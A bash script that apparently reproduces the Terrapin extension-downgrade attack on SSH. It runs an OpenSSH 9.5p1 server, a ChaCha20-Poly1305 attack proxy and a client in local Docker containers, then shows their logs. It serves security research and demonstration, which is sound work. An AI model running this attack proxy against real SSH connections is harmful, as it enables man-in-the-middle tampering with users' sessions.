#!/bin/bash
bash ../impl/build.sh
bash ../pocs/build.sh

# Start OpenSSH server on port 2222 to connect to
echo "[+] Starting OpenSSH 9.5p1 server on port 2222"
docker run -d \
  --network host \
  --name terrapin-artifacts-server \
  terrapin-artifacts/openssh-server:9.5p1 -d -p 2222 > /dev/null 2>&1
echo "[+] Starting extension downgrade attack proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start extension downgrade attack PoC proxy
docker run -d \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/ext-downgrade-chacha20-poly1305 --server-ip 127.0.0.1 --server-port 2222 > /dev/null 2>&1

echo "[+] Connecting with OpenSSH 9.5p1 client to 127.0.0.1:22 as user victim"
docker run \
  --network host \
  --name terrapin-artifacts-client \
  terrapin-artifacts/openssh-client:9.5p1 -vvv -o StrictHostKeyChecking=no victim@127.0.0.1 > /dev/null 2>&1

echo "[+] Stopping all containers"
docker stop terrapin-artifacts-server terrapin-artifacts-poc terrapin-artifacts-client > /dev/null 2>&1

# Output log files using less
docker logs terrapin-artifacts-server > terrapin-artifacts-server.log 2>&1
docker logs terrapin-artifacts-poc > terrapin-artifacts-poc.log 2>&1
docker logs terrapin-artifacts-client > terrapin-artifacts-client.log 2>&1
less terrapin-artifacts-server.log terrapin-artifacts-poc.log terrapin-artifacts-client.log
rm terrapin-artifacts-server.log terrapin-artifacts-poc.log terrapin-artifacts-client.log
docker rm terrapin-artifacts-server terrapin-artifacts-poc terrapin-artifacts-client > /dev/null 2>&1
